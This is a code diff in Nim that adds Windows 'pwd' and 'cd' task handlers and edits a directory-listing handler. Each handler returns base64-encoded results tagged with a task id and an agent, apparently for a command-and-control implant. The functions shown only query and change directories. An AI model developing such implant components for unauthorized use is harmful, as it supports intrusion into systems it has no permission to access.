@@ -2,9 +2,66 @@ import os, strutils, strformat, base64, winim, times, algorithm
 
 import ../types
 
+# Retrieve current working directory
+proc taskPwd*(task: Task): TaskResult = 
+
+    echo fmt"Retrieving current working directory."
+
+    try: 
+        
+        # Get current working directory using GetCurrentDirectory
+        let 
+            buffer = newWString(MAX_PATH + 1)
+            length = GetCurrentDirectoryW(MAX_PATH, &buffer)
+        
+        if length == 0:
+            raise newException(OSError, fmt"Failed to get working directory ({GetLastError()}).")
+
+        return TaskResult(
+            task: task.id, 
+            agent: task.agent, 
+            data: encode($buffer[0 ..< (int)length] & "\n"),
+            status: Completed
+        )
+
+    except CatchableError as err: 
+        return TaskResult(
+            task: task.id, 
+            agent: task.agent, 
+            data: encode(fmt"An error occured: {err.msg}" & "\n"),
+            status: Failed 
+        )
+
+# Change working directory
+proc taskCd*(task: Task): TaskResult = 
+
+    let targetDirectory = task.args.join(" ").replace("\"", "").replace("'", "")
+    echo fmt"Changing current working directory to {targetDirectory}."
+
+    try: 
+        # Get current working directory using GetCurrentDirectory
+        if SetCurrentDirectoryW(targetDirectory) == FALSE:         
+            raise newException(OSError, fmt"Failed to change working directory ({GetLastError()}).")
+
+        return TaskResult(
+            task: task.id, 
+            agent: task.agent, 
+            data: encode(""),
+            status: Completed
+        )
+
+    except CatchableError as err: 
+        return TaskResult(
+            task: task.id, 
+            agent: task.agent, 
+            data: encode(fmt"An error occured: {err.msg}" & "\n"),
+            status: Failed 
+        )
+
+# List files and directories at a specific or at the current path
 proc taskDir*(task: Task): TaskResult = 
 
-    echo fmt"Listing files and directories in current working directory."
+    echo fmt"Listing files and directories."
 
     try: 
         # Check if users wants to list files in the current working directory or at another path
